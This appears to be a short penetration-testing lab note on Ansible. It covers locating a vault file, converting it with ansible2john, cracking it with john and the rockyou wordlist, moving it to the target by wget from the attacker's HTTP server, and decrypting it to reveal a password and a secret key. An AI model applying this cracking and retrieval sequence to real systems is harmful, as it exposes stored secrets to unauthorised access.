# Ansible

## Interesting files :

```bash
/etc/ansible/hosts # Contains Ansible Hosts
/opt/ansible/webserver.yaml # Contains Ansible vault
```

## Cracking Ansible Vault key whic is inside "webserver.yaml".

1. Copy the Ansible vault hash to a file in our kali box.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ cat ansiblehash.yml         
$ANSIBLE_VAULT;1.1;AES256
85749358902385290352387534692304572903837348529753875298573289572385798237528933
84958439658349058390485204372893781012847285320927384990128438756092350389501789
47389948729578375928750238297952387527308957302860238769523759086237823302723838
57298738895782350931753892579023897509372807230502739082709375032709570397923079
47389948728738375928759378297959407527334898302860238769523759086237
```

2. Use ansible2john to convert the hash in a cracking format.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ python /usr/share/john/ansible2john.py ansiblehash.yml > crackme.txt
   
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ cat crackme.txt    
ansiblehash.yml:$ansible$0*0*fe73d35cab482b4925e4898e6d7cd4150e6fac64bb148f5975ede38402a01528*164531331b5e08326cb2eaa1c94b14bed942d7f8d03c07fe4ef139c3682a1e7d*2c41668638e237e7288408978181cacd68c1a120ed27d32fda23906f8f5148f8
```

3. Crack the key using john.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
```

Now that we retrieve the vault password. We can upload the ansible vault hash on the CB3 box, and decrypt the vault content using ansible-vault and the cracked password.

4. Start a SimpleHTTPServer where the ansible hash is stored in our kali.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/]
└─$ python -m SimpleHTTPServer 443                                      
Serving HTTP on 0.0.0.0 port 443 ...
```

5. Then download it inside the target box.

```bash
target@sinhack2:~$ wget http://192.168.x.x:443/ansiblehash.yml
```

6. Decrypt the vault using ansible-vault and the previous cracked password.

```bash
target@sinhack2:~$ cat ansiblehash.yml | ansible-vault decrypt
cat ansiblehash.yml | ansible-vault decrypt
Vault password: sup3rp@ssw0rd5

Hello word,

The secret key is :

SuperSecretInsideTheVault28193

Decryption successful
```
